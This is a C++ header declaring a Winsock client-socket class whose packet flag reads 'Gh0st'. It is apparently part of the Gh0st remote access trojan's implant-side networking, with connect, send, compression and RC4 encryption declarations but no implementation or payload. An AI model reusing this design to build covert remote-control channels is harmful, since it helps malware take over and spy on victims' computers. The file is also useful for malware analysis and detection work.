// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#pragma once
#include <winsock2.h>
#include <mswsock.h>
#include "Buffer.h"	// Added by ClassView
#include "Manager.h"
// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5

class CClientSocket  
{
	friend class CManager;
public:
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;
	void Disconnect();
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void run_event_loop();
	bool IsRunning();
	void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len);
	void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len);
	void encryption(LPBYTE szData, unsigned long Size);

	HANDLE m_hWorkerThread = NULL;
	SOCKET m_Socket;
	HANDLE m_hEvent = NULL;

	CClientSocket();
	virtual ~CClientSocket();
private:
	unsigned char    m_strkey[256];
	BYTE	m_bPacketFlag[FLAG_SIZE];
	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	bool m_bIsRunning;
	CManager	*m_pManager;

};


